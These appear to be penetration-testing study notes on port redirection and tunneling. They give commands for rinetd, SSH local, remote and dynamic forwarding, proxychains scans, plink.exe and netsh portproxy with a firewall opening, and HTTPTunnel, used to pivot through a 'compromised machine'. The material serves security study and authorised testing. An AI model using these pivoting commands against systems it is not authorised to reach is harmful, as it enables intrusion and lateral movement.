# Port Redirection & Tunneling

## Port Redirection

### RINETD

``` bash
nano /etc/rinetd.conf
```

Add forword from kali linux port 80 to ip port 80.

``` txt
# bindadress    bindport  connectaddress  connectport
0.0.0.0 80 192.168.11.1 80
```

Restart RINETD service

``` bash
sudo service rinetd restart
```

Checking running service at port 80

``` bash
ss -antp | grep 80
```

## SSH Tunneling

### Local Forwarding

``` bash
ssh -N -L [bind_address:]port:host:hostport [username@address]
```

* `-N` Don't need to execute code
* `-L` Local forward
* `0.0.0.0:80` Bind port 80 at Kali Machine
* `10.10.10.9:80` Forward traffic to target IP
* `hades@192.168.11.133` Compromised machine

``` bash
sudo ssh -N -L 0.0.0.0:9001:10.10.10.10:8080 hades@192.168.11.133 -i ./.ssh/id_rsa
```

### Remote Forwarding

``` bash
ssh -N -R [bind_address:]port:host:hostport [username@address]
```

``` bash
ssh -N -R 0.0.0.0:9001:10.10.10.10:80 kali@myip -i /home/hades/.ssh/kali-idrsa
```

### Dynamic Forwarding

``` bash
ssh -N -D <address to bind to>:<port to bind to> <username>@<SSH server address>
```

``` bash
ssh -N -D 127.0.0.1:9001 hades@192.168.11.135 -i .ssh/id_rsa
```

`/etc/proxychains.conf`

``` txt
socks4 127.0.0.1 9001
```

Using `proxychains` to use the proxy

``` bash
proxychains smbclient -L 192.168.35.129
```

``` bash
sudo proxychains nmap --top-ports=5 -Pn -sT 192.168.35.129
```

## Plink.exe

``` bash
plink.exe -ssh -l user -pw passwd -R 0.0.0.0:9001:needed-access-ip:12345 myip
```

Answer command trick using `echo`

```
cmd.exe /c echo y | plink.exe -ssh -l user -pw passwd -R 0.0.0.0:9001:needed-access-ip:12345 myip
```

## NetSH

``` bash
netsh interface portproxy add v4tov4 listenport=9001 listenaddress=0.0.0.0 connectport=12345 connectaddress=192.168.11.1
```

``` bash
netstat -anp TCP | find "9001"
```

Adding a firewall rule to allow inbound connections on port 9001

``` bash
netsh advfirewall firewall add rule name="forward_port_rule" protocol=TCP dir=in localip=192.168.11.135 localport=9001 action=allow
```

## HTTPTunnel-ing

Redirect traffic of RDP at 192.168.11.135 to local at port 8888

``` bash
ssh -L 0.0.0.0:8888:192.168.11.135:3389 hades@127.0.0.1
```

``` bash
ss -antp | grep "8888"
```

Redirect all traffic to http protocol.

``` bash
hts --forward-port localhost:8888 1234
```

``` bash
hts --forward-port 192.168.35.129:3389 1234
```

``` bash
ps aux | grep hts
```

At Kali machine, redirect RDP protocol to http protocol

``` bash
htc --forward-port 8080 192.168.11.133:1234
```